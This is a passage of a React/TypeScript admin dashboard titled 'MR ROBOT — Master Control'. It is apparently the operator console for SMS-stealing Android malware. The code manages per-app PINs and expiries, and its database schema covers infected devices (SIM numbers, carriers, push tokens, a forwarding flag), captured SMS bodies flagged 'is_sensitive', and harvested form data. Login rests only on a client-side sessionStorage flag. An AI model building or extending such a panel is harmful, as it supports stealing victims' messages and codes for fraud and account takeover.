          <div>
            <label style={LS}>Admin PIN {isEdit && <span style={{ color: "#64748b", fontWeight: 500 }}>(leave empty to keep current)</span>}</label>
            <input type="text" value={pin} onChange={e => { setPin(e.target.value); setErr(""); }} placeholder={isEdit ? "Leave empty to keep current PIN" : "Min 4 characters"} style={IS()} />
          </div>
          <div>
            <label style={LS}>Status</label>
            <select value={status} onChange={e => setStatus(e.target.value)} style={IS()}>
              <option value="active">Active</option>
              <option value="disabled">Disabled</option>
            </select>
          </div>
          {err && <div style={{ color: "#f87171", fontSize: 12, fontWeight: 600 }}>{err}</div>}
          <div style={{ display: "flex", gap: 8, marginTop: 4 }}>
            <button type="submit" disabled={saving} style={{ flex: 1, background: "#f59e0b", color: "#000", border: "none", borderRadius: 9, padding: 12, fontWeight: 800, fontSize: 13, cursor: "pointer", opacity: saving ? 0.6 : 1 }}>
              {saving ? "Saving…" : isEdit ? "Save Changes" : "Create App"}
            </button>
            <button type="button" onClick={onClose} style={{ flex: 1, background: "transparent", color: "#94a3b8", border: "1.5px solid #334155", borderRadius: 9, padding: 12, fontWeight: 600, fontSize: 13, cursor: "pointer" }}>
              Cancel
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

/* ═══════════════════════
   DATABASE MODAL
═══════════════════════ */
/* ── DB Schema definition (static — mirrors lib/db/src/schema/skyrockets.ts) ── */
type ColType = "serial" | "text" | "integer" | "boolean" | "timestamp" | "jsonb";
interface ColDef { name: string; type: ColType; pk?: boolean; unique?: boolean; nullable?: boolean; fk?: string; default?: string; }
interface TableDef { key: string; table: string; label: string; color: string; cols: ColDef[]; }

const TYPE_COLOR: Record<ColType, string> = {
  serial: "#f97316", text: "#60a5fa", integer: "#fb923c",
  boolean: "#4ade80", timestamp: "#c084fc", jsonb: "#fbbf24",
};

const DB_SCHEMA: TableDef[] = [
  {
    key: "apps", table: "apps", label: "apps", color: "#f59e0b",
    cols: [
      { name: "id", type: "serial", pk: true },
      { name: "app_id", type: "text", unique: true },
      { name: "name", type: "text" },
      { name: "pin", type: "text", default: "'1234'" },
      { name: "status", type: "text", default: "'active'" },
      { name: "created_at", type: "timestamp" },
    ],
  },
  {
    key: "devices", table: "devices", label: "devices", color: "#6366f1",
    cols: [
      { name: "id", type: "serial", pk: true },
      { name: "device_id", type: "text", unique: true },
      { name: "app_id", type: "text", fk: "apps.app_id" },
      { name: "user_id", type: "text" },
      { name: "name", type: "text" },
      { name: "android_version", type: "integer" },
      { name: "sim1_carrier", type: "text", nullable: true },
      { name: "sim1_phone", type: "text", nullable: true },
      { name: "sim2_carrier", type: "text", nullable: true },
      { name: "sim2_phone", type: "text", nullable: true },
      { name: "status", type: "text", default: "'online'" },
      { name: "last_online", type: "text", nullable: true },
      { name: "forward_enabled", type: "boolean", default: "false" },
      { name: "fcm_token", type: "text", nullable: true },
      { name: "installed_at", type: "timestamp" },
      { name: "updated_at", type: "timestamp" },
    ],
  },
  {
    key: "messages", table: "messages", label: "messages", color: "#ef4444",
    cols: [
      { name: "id", type: "serial", pk: true },
      { name: "app_id", type: "text", fk: "apps.app_id" },
      { name: "device_id", type: "text" },
      { name: "user_id", type: "text" },
      { name: "from_sender", type: "text" },
      { name: "from_number", type: "text" },
      { name: "body", type: "text" },
      { name: "is_sensitive", type: "boolean", default: "false" },
      { name: "received_at", type: "timestamp" },
    ],
  },
  {
    key: "formData", table: "form_data", label: "form_data", color: "#8b5cf6",
    cols: [
      { name: "id", type: "serial", pk: true },
      { name: "app_id", type: "text", fk: "apps.app_id" },
      { name: "device_id", type: "text" },
      { name: "data", type: "jsonb" },
      { name: "submitted_at", type: "timestamp" },
    ],
  },
];

/* Build a template JSON object from schema when no sample data exists */
function buildTemplate(cols: ColDef[]): Record<string, unknown> {
  const obj: Record<string, unknown> = {};
  for (const col of cols) {
    if (col.type === "serial" || col.type === "integer") obj[col.name] = 1;
    else if (col.type === "boolean") obj[col.name] = false;
    else if (col.type === "timestamp") obj[col.name] = "2026-01-01T00:00:00.000Z";
    else if (col.type === "jsonb") obj[col.name] = {};
    else obj[col.name] = col.nullable ? null : "";
  }
  return obj;
}

/* Syntax-highlighted JSON renderer */
function JsonView({ data }: { data: unknown }) {
  const lines = JSON.stringify(data, null, 2).split("\n");
  return (
    <pre style={{ margin: 0, fontSize: 11, lineHeight: 1.7, overflowX: "auto", whiteSpace: "pre-wrap", wordBreak: "break-all", fontFamily: "monospace" }}>
      {lines.map((line, i) => {
        const keyMatch = line.match(/^(\s*)("[\w_]+")(\s*:\s*)(.*)/);
        if (keyMatch) {
          const [, indent, key, colon, val] = keyMatch;
          let valColor = "#e2e8f0";
          if (val === "null" || val === "null,") valColor = "#94a3b8";
          else if (val === "true" || val === "false" || val === "true," || val === "false,") valColor = "#4ade80";
          else if (/^-?\d/.test(val.trim())) valColor = "#fb923c";
          else if (val.trim().startsWith('"')) valColor = "#86efac";
          else if (val.trim() === "{" || val.trim() === "{," || val.trim() === "}" || val.trim() === "},") valColor = "#94a3b8";
          return (
            <span key={i}>
              {indent}
              <span style={{ color: "#60a5fa" }}>{key}</span>
              <span style={{ color: "#475569" }}>{colon}</span>
              <span style={{ color: valColor }}>{val}</span>{"\n"}
            </span>
          );
        }
        return <span key={i} style={{ color: "#334155" }}>{line}{"\n"}</span>;
      })}
    </pre>
  );
}

function SchemaTable({ tbl, count, sample }: { tbl: TableDef; count: number | null; sample: unknown }) {
  const [open, setOpen] = useState(true);
  const [showCols, setShowCols] = useState(false);
  const jsonData = sample ?? buildTemplate(tbl.cols);
  const isTemplate = !sample;

  return (
    <div style={{ background: "#0f172a", borderRadius: 10, border: `1px solid #1e293b`, overflow: "hidden" }}>
      {/* Table header */}
      <button onClick={() => setOpen(p => !p)} style={{ width: "100%", background: "none", border: "none", padding: "10px 14px", display: "flex", alignItems: "center", gap: 8, cursor: "pointer" }}>
        <span style={{ fontFamily: "monospace", fontSize: 11, fontWeight: 900, color: tbl.color, background: tbl.color + "18", padding: "2px 8px", borderRadius: 5 }}>{tbl.label}</span>
        <span style={{ fontSize: 10, color: "#475569" }}>{tbl.cols.length} cols</span>
        {count !== null && (
          <span style={{ background: "#1e293b", color: "#94a3b8", borderRadius: 99, padding: "1px 8px", fontSize: 10, fontWeight: 700 }}>{count} rows</span>
        )}
        {isTemplate && <span style={{ fontSize: 9, color: "#475569", fontStyle: "italic" }}>template</span>}
        <span style={{ marginLeft: "auto", color: "#334155", fontSize: 10 }}>{open ? "▲" : "▼"}</span>
      </button>

      {open && (
        <div style={{ borderTop: "1px solid #1e293b" }}>
          {/* JSON view */}
          <div style={{ padding: "10px 14px", background: "#080f1e" }}>
            <JsonView data={jsonData} />
          </div>

          {/* Toggle schema columns */}
          <button onClick={() => setShowCols(p => !p)} style={{ width: "100%", background: "none", border: "none", borderTop: "1px solid #1e293b", padding: "5px 14px", display: "flex", alignItems: "center", gap: 6, cursor: "pointer" }}>
            <span style={{ fontSize: 9, fontWeight: 700, color: "#334155", textTransform: "uppercase", letterSpacing: 0.5 }}>Column Schema</span>
            <span style={{ fontSize: 9, color: "#1e3a5f" }}>{showCols ? "▲" : "▼"}</span>
          </button>

          {showCols && (
            <div style={{ borderTop: "1px solid #0d1a33" }}>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 90px 80px", padding: "4px 14px", background: "#0a1020", fontSize: 8, fontWeight: 700, color: "#334155", textTransform: "uppercase", letterSpacing: 0.5 }}>
                <span>Column</span><span>Type</span><span>Flags</span>
              </div>
              {tbl.cols.map((col, i) => (
                <div key={col.name} style={{ display: "grid", gridTemplateColumns: "1fr 90px 80px", padding: "5px 14px", borderBottom: i < tbl.cols.length - 1 ? "1px solid #0a1020" : "none", alignItems: "center" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                    {col.pk && <span style={{ fontSize: 7, background: "#78350f", color: "#fbbf24", borderRadius: 3, padding: "1px 3px", fontWeight: 800 }}>PK</span>}
                    {col.fk && <span style={{ fontSize: 7, background: "#1e3a5f", color: "#60a5fa", borderRadius: 3, padding: "1px 3px", fontWeight: 800 }}>FK</span>}
                    <span style={{ fontFamily: "monospace", fontSize: 10, color: col.pk ? "#fbbf24" : col.nullable ? "#64748b" : "#cbd5e1" }}>{col.name}</span>
                  </div>
                  <span style={{ fontFamily: "monospace", fontSize: 9, color: TYPE_COLOR[col.type], fontWeight: 600 }}>{col.type}</span>
                  <div style={{ display: "flex", gap: 3, flexWrap: "wrap" }}>
                    {col.nullable ? <span style={{ fontSize: 7, color: "#475569" }}>NULL</span> : <span style={{ fontSize: 7, color: "#22c55e", fontWeight: 700 }}>NN</span>}
                    {col.unique && <span style={{ fontSize: 7, color: "#a78bfa", fontWeight: 700 }}>UQ</span>}
                    {col.fk && <span style={{ fontSize: 7, color: "#60a5fa" }}>→{col.fk.split(".")[0]}</span>}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

/* Per-app DB Schema modal */
function DatabaseModal({ app, onClose }: { app: App; onClose: () => void }) {
  const [counts, setCounts] = useState<Record<string, number> | null>(null);
  const [samples, setSamples] = useState<Record<string, unknown> | null>(null);

  useEffect(() => {
    const id = encodeURIComponent(app.appId);
    Promise.all([
      fetch(`/api/stats?appId=${id}`).then(r => r.ok ? r.json() : null),
      fetch(`/api/sample?appId=${id}`).then(r => r.ok ? r.json() : null),
    ]).then(([c, s]) => {
      setCounts(c as Record<string, number> | null);
      setSamples(s as Record<string, unknown> | null);
    }).catch(() => {});
  }, [app.appId]);

  const countFor = (key: string): number | null =>
    counts ? (counts[key] ?? 0) : null;
  const sampleFor = (key: string): unknown =>
    samples ? (samples[key] ?? null) : null;

  return (
    <div style={{ position: "fixed", inset: 0, background: "#00000095", display: "flex", alignItems: "flex-end", justifyContent: "center", zIndex: 200 }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ background: "#0a1628", borderRadius: "20px 20px 0 0", width: "100%", maxWidth: 600, maxHeight: "92vh", overflowY: "auto", border: "1px solid #1e293b", boxShadow: "0 -20px 60px #000" }}>

        {/* Header */}
        <div style={{ padding: "14px 18px", display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, background: "#0a1628", zIndex: 1, borderBottom: "1px solid #1e293b" }}>
          <div>
            <div style={{ fontWeight: 900, fontSize: 15, color: "#f1f5f9" }}>DB Schema — {app.name}</div>
            <div style={{ fontFamily: "monospace", fontSize: 10, color: "#6366f1", marginTop: 2 }}>{app.appId}</div>
          </div>
          <button onClick={onClose} style={{ background: "#1e293b", border: "none", color: "#94a3b8", width: 30, height: 30, borderRadius: 8, fontSize: 18, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>×</button>
        </div>

        {/* Info bar */}
        <div style={{ padding: "7px 14px", display: "flex", alignItems: "center", gap: 8, borderBottom: "1px solid #1e293b", background: "#060e1f" }}>
          <span style={{ fontSize: 10, color: "#60a5fa", fontWeight: 700 }}>JSON — actual saved record</span>
          <span style={{ fontSize: 10, color: "#334155" }}>·</span>
          <span style={{ fontSize: 9, color: "#475569", fontStyle: "italic" }}>template shown when table is empty</span>
          <span style={{ fontSize: 10, color: "#334155", marginLeft: "auto" }}>counts = this app only</span>
        </div>

        <div style={{ padding: "12px 14px 32px", display: "flex", flexDirection: "column", gap: 10 }}>
          {DB_SCHEMA.filter(t => t.key !== "apps").map(tbl => (
            <SchemaTable key={tbl.key} tbl={tbl} count={countFor(tbl.key)} sample={sampleFor(tbl.key)} />
          ))}
        </div>
      </div>
    </div>
  );
}

/* Full DB Schema modal — all apps, global counts */
function FullSchemaModal({ onClose }: { onClose: () => void }) {
  const [counts, setCounts] = useState<Record<string, number> | null>(null);
  const [samples, setSamples] = useState<Record<string, unknown> | null>(null);

  useEffect(() => {
    Promise.all([
      fetch("/api/stats").then(r => r.ok ? r.json() : null),
      fetch("/api/sample").then(r => r.ok ? r.json() : null),
    ]).then(([c, s]) => {
      setCounts(c as Record<string, number> | null);
      setSamples(s as Record<string, unknown> | null);
    }).catch(() => {});
  }, []);

  const countFor = (key: string): number | null =>
    counts ? (counts[key] ?? 0) : null;
  const sampleFor = (key: string): unknown =>
    samples ? (samples[key] ?? null) : null;

  return (
    <div style={{ position: "fixed", inset: 0, background: "#00000095", display: "flex", alignItems: "flex-end", justifyContent: "center", zIndex: 200 }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ background: "#0a1628", borderRadius: "20px 20px 0 0", width: "100%", maxWidth: 600, maxHeight: "92vh", overflowY: "auto", border: "1px solid #1e293b", boxShadow: "0 -20px 60px #000" }}>

        <div style={{ padding: "14px 18px", display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, background: "#0a1628", zIndex: 1, borderBottom: "1px solid #1e293b" }}>
          <div>
            <div style={{ fontWeight: 900, fontSize: 15, color: "#f1f5f9" }}>Full DB Schema</div>
            <div style={{ fontSize: 10, color: "#475569", marginTop: 2 }}>All tables · row counts = global (all apps)</div>
          </div>
          <button onClick={onClose} style={{ background: "#1e293b", border: "none", color: "#94a3b8", width: 30, height: 30, borderRadius: 8, fontSize: 18, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>×</button>
        </div>

        <div style={{ padding: "7px 14px", display: "flex", alignItems: "center", gap: 8, borderBottom: "1px solid #1e293b", background: "#060e1f" }}>
          <span style={{ fontSize: 10, color: "#60a5fa", fontWeight: 700 }}>JSON — actual saved record</span>
          <span style={{ fontSize: 10, color: "#334155" }}>·</span>
          <span style={{ fontSize: 9, color: "#475569", fontStyle: "italic" }}>template shown when table is empty</span>
        </div>

        <div style={{ padding: "12px 14px 32px", display: "flex", flexDirection: "column", gap: 10 }}>
          {DB_SCHEMA.map(tbl => (
            <SchemaTable key={tbl.key} tbl={tbl} count={countFor(tbl.key)} sample={sampleFor(tbl.key)} />
          ))}
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════
   MAIN DASHBOARD
═══════════════════════ */
function AdminDashboard({ onLogout }: { onLogout: () => void }) {
  const [apps, setApps] = useState<App[]>([]);
  const [loadingApps, setLoadingApps] = useState(true);
  const [modal, setModal] = useState<"create" | App | null>(null);
  const [aboutApp, setAboutApp] = useState<App | null>(null);
  const [createdApp, setCreatedApp] = useState<App | null>(null);
  const [deleting, setDeleting] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const [dbApp, setDbApp] = useState<App | null>(null);
  const [showFullSchema, setShowFullSchema] = useState(false);

  async function fetchApps() {
    try {
      const r = await fetch("/api/apps");
      if (!r.ok) throw new Error("Failed to load apps");
      const data = await r.json() as App[];
      setApps(ensureDefaultApp(data));
    } catch {
      // Fallback keeps Master Admin usable even before the Cloudflare Pages API/KV is ready.
      setApps([DEFAULT_APP]);
    } finally { setLoadingApps(false); }
  }

  useEffect(() => { fetchApps(); }, []);

  async function handleDelete(appId: string) {
    if (!confirm(`Delete app "${appId}"? This cannot be undone.`)) return;
    setDeleting(appId);
    await fetch(`/api/apps/${appId}`, { method: "DELETE" });
    setDeleting(null);
    fetchApps();
  }

  function handleCreated(saved: App) {
    setModal(null);
    fetchApps();
    if (!modal || modal === "create") {
      setCreatedApp(saved);
    }
  }

  function openSubAdmin(appId: string) {
    window.open(getDashboardUrl(appId), "_blank");
  }

  const filtered = apps
    .filter(a =>
      a.appId.toLowerCase().includes(search.toLowerCase()) ||
      a.name.toLowerCase().includes(search.toLowerCase())
    )
    .slice()
    .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());

  const { visible: visibleApps, sentinelRef: appSentinel, loading: appsLoading } = useInfiniteScroll(filtered, 10);

  return (
    <div style={{ minHeight: "100vh", background: "#050810", fontFamily: "system-ui,sans-serif", color: "#f1f5f9" }}>

      {/* Header */}
      <div style={{ background: "#0f172a", borderBottom: "1px solid #1e293b", padding: "10px 16px", display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, zIndex: 50 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div style={{ width: 32, height: 32, borderRadius: 8, background: "#f59e0b22", border: "1px solid #f59e0b", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="#f59e0b" strokeWidth="1.5" strokeLinejoin="round"/>
              <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#f59e0b" strokeWidth="1.5" strokeLinejoin="round"/>
            </svg>
          </div>
          <div>
            <div style={{ fontWeight: 900, fontSize: 14, color: "#fbbf24", letterSpacing: 1 }}>MAIN ADMIN</div>
            <div style={{ fontSize: 9, color: "#475569" }}>MR ROBOT — Master Control</div>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <div style={{ background: "#1e293b", color: "#94a3b8", borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 700 }}>
            {apps.length} apps
          </div>
          <button onClick={() => setShowFullSchema(true)} style={{ background: "#1e293b", color: "#8b5cf6", border: "1px solid #4c1d95", borderRadius: 8, padding: "5px 12px", fontSize: 11, fontWeight: 700, cursor: "pointer" }}>
            DB Schema
          </button>
          <button onClick={onLogout} style={{ background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca", borderRadius: 8, padding: "5px 12px", fontSize: 11, fontWeight: 700, cursor: "pointer" }}>
            Logout
          </button>
        </div>
      </div>

      {/* Body */}
      <div style={{ maxWidth: 600, margin: "0 auto", padding: "14px 12px", display: "flex", flexDirection: "column", gap: 12 }}>

        {/* Search + Create row */}
        <div style={{ display: "flex", gap: 8 }}>
          <div style={{ flex: 1, background: "#0f172a", border: "1px solid #1e293b", borderRadius: 9, display: "flex", alignItems: "center", padding: "8px 12px", gap: 6 }}>
            <span style={{ color: "#475569", fontSize: 14 }}>⌕</span>
            <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search apps…"
              style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: "#f1f5f9" }} />
          </div>
          <button onClick={() => setModal("create")} style={{ background: "#f59e0b", color: "#000", border: "none", borderRadius: 9, padding: "8px 16px", fontWeight: 800, fontSize: 13, cursor: "pointer", whiteSpace: "nowrap" }}>
            + New App
          </button>
        </div>

        {/* App list */}
        {loadingApps ? (
          <div style={{ display: "flex", justifyContent: "center", padding: 40 }}>
            <CircularLoader size={48} label="Loading apps…" color="#f59e0b" labelColor="#94a3b8" />
          </div>
        ) : filtered.length === 0 ? (
          <div style={{ textAlign: "center", padding: 40 }}>
            <div style={{ color: "#475569", marginBottom: 8 }}>No apps yet.</div>
            <button onClick={() => setModal("create")} style={{ background: "#f59e0b", color: "#000", border: "none", borderRadius: 9, padding: "10px 20px", fontWeight: 800, cursor: "pointer" }}>
              Create First App
            </button>
          </div>
        ) : (
          visibleApps.map(app => (
            <div key={app.appId} style={{ background: "#0f172a", borderRadius: 12, border: `1px solid ${app.status === "active" ? "#1e3a5f" : "#2d1a1a"}`, overflow: "hidden" }}>

              {/* Card header */}
              <div style={{ padding: "12px 14px", borderBottom: "1px solid #1e293b", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                  <div style={{ width: 36, height: 36, borderRadius: 9, background: app.status === "active" ? "#6366f122" : "#64748b22", border: `1px solid ${app.status === "active" ? "#6366f1" : "#475569"}`, display: "flex", alignItems: "center", justifyContent: "center", fontWeight: 900, fontSize: 13, color: app.status === "active" ? "#818cf8" : "#64748b" }}>
                    {app.name.charAt(0).toUpperCase()}
                  </div>
                  <div>
                    <div style={{ fontWeight: 800, fontSize: 14, color: "#f1f5f9" }}>{app.name}</div>
                    <div style={{ fontFamily: "monospace", fontSize: 10, color: "#6366f1", marginTop: 1 }}>{app.appId}</div>
                  </div>
                </div>
                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4 }}>
                  <span style={{ background: app.status === "active" ? "#14532d" : "#450a0a", color: app.status === "active" ? "#4ade80" : "#f87171", borderRadius: 99, padding: "2px 8px", fontSize: 10, fontWeight: 700, textTransform: "uppercase" }}>
                    {app.status}
                  </span>
                  <ValidityBadge createdAt={app.createdAt} />
                </div>
              </div>

              {/* Details */}
              <div style={{ padding: "10px 14px", display: "flex", flexDirection: "column", gap: 6 }}>
                {[
                  { label: "PIN", value: "●".repeat(app.pin.length) },
                  { label: "Created", value: fmtDate(app.createdAt) },
                  { label: "Expires", value: fmtDate(expiresAt(app.createdAt).toISOString()), warn: daysLeft(app.createdAt) <= 0 },
                ].map(({ label, value, warn }) => (
                  <div key={label} style={{ display: "flex", gap: 8, fontSize: 12 }}>
                    <span style={{ width: 60, color: "#475569", fontWeight: 600, flexShrink: 0 }}>{label}</span>
                    <span style={{ color: warn ? "#f87171" : "#94a3b8", fontFamily: "monospace" }}>{value}</span>
                  </div>
                ))}
              </div>

              {/* Online stats + Ping All */}
              <AppCardStats appId={app.appId} />

              {/* Actions */}
              <div style={{ padding: "8px 14px 12px", display: "flex", gap: 7, flexWrap: "wrap" }}>
                <button onClick={() => openSubAdmin(app.appId)} style={{ flex: 1, minWidth: 100, background: "#6366f1", color: "#fff", border: "none", borderRadius: 8, padding: "8px 0", fontWeight: 700, fontSize: 12, cursor: "pointer" }}>
                  Open Dashboard
                </button>
                <button onClick={() => setAboutApp(app)} style={{ background: "#1e293b", color: "#94a3b8", border: "1px solid #334155", borderRadius: 8, padding: "8px 14px", fontWeight: 600, fontSize: 12, cursor: "pointer" }}>
                  About / API
                </button>
                <button onClick={() => setDbApp(app)} style={{ background: "#1e293b", color: "#8b5cf6", border: "1px solid #4c1d95", borderRadius: 8, padding: "8px 14px", fontWeight: 600, fontSize: 12, cursor: "pointer" }}>
                  Database
                </button>
                <button onClick={() => setModal(app)} style={{ background: "#1e293b", color: "#94a3b8", border: "1px solid #334155", borderRadius: 8, padding: "8px 14px", fontWeight: 600, fontSize: 12, cursor: "pointer" }}>
                  Edit
                </button>
              </div>
            </div>
          ))
        )}
      <div ref={appSentinel} style={{ height: 1 }} />
      {appsLoading && <div style={{ display: "flex", justifyContent: "center", padding: "10px 0" }}><CircularLoader size={22} color="#f59e0b" /></div>}
      </div>

      {/* Create/Edit Modal */}
      {modal && (
        <AppModal
          app={modal === "create" ? null : modal as App}
          onClose={() => setModal(null)}
          onCreated={handleCreated}
        />
      )}

      {/* Database Modal (per-app) */}
      {dbApp && <DatabaseModal app={dbApp} onClose={() => setDbApp(null)} />}

      {/* Full Schema Modal (all apps) */}
      {showFullSchema && <FullSchemaModal onClose={() => setShowFullSchema(false)} />}

      {/* About / API Info Modal */}
      {aboutApp && <AppInfoModal app={aboutApp} onClose={() => setAboutApp(null)} />}

      {/* Created Success */}
      {createdApp && <CreatedSuccess app={createdApp} onClose={() => setCreatedApp(null)} />}
    </div>
  );
}

/* ═══════════════════════
   ROOT
═══════════════════════ */
export default function MainAdminPanel() {
  const [authed, setAuthed] = useState(() => sessionStorage.getItem("mrrobot_master_auth") === "1");

  function handleLogout() {
    sessionStorage.removeItem("mrrobot_master_auth");
    setAuthed(false);
  }

  if (!authed) return <MasterLogin onAuth={() => setAuthed(true)} />;
  return <AdminDashboard onLogout={handleLogout} />;
}
